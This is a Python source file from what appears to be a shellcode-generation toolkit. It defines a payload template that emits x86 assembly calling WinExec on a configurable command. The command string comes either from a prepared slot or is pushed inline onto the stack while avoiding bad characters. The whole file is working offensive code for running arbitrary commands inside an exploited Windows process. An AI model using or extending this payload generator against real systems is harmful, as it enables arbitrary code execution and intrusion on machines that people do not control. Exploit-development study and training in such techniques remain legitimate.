"""Run-command payload template.

Requires: WinExec
Builds command string inline via push (no fixed slot required).
"""
from __future__ import annotations

from .base import PayloadTemplate, TemplateConfig
from Tools.strings import emit_push, to_dwords


class RunCommandTemplate(PayloadTemplate):
    REQUIRED_FUNCTIONS = ("WinExec",)
    REQUIRED_VARIABLES = ()

    def emit(self, layout, config: TemplateConfig) -> str:
        winexec = layout.slot("WinExec").ebp_ref
        command = config.command

        # Prefer a pre-built 'cmd' slot; fall back to inline push
        try:
            cmd_ref = layout.slot("cmd").ebp_ref
            return "\n".join([
                "; ── Run Command Payload ─────────────────────────────────────────",
                f"; Command: {command} (from 'cmd' slot at {cmd_ref})",
                "",
                "    ; WinExec(&cmd, SW_SHOWNORMAL)",
                f"    lea  eax, {cmd_ref}",
                "    push 0x1                  ; uCmdShow = SW_SHOWNORMAL",
                "    push eax                  ; lpCmdLine",
                f"    call dword ptr {winexec}",
                "",
            ])
        except KeyError:
            pass

        # Inline push fallback
        push_asm = emit_push(command, badchars=config.badchars).asm
        n_bytes = len(to_dwords(command)) * 4
        return "\n".join([
            "; ── Run Command Payload ─────────────────────────────────────────",
            f"; Command: {command} (inline push)",
            "",
            push_asm,
            "    push 0x1                  ; uCmdShow = SW_SHOWNORMAL",
            "    push esi                  ; lpCmdLine (from emit_push mov esi, esp)",
            f"    call dword ptr {winexec}",
            f"    add  esp, 0x{n_bytes:02x}        ; pop command string from stack",
            "",
        ])
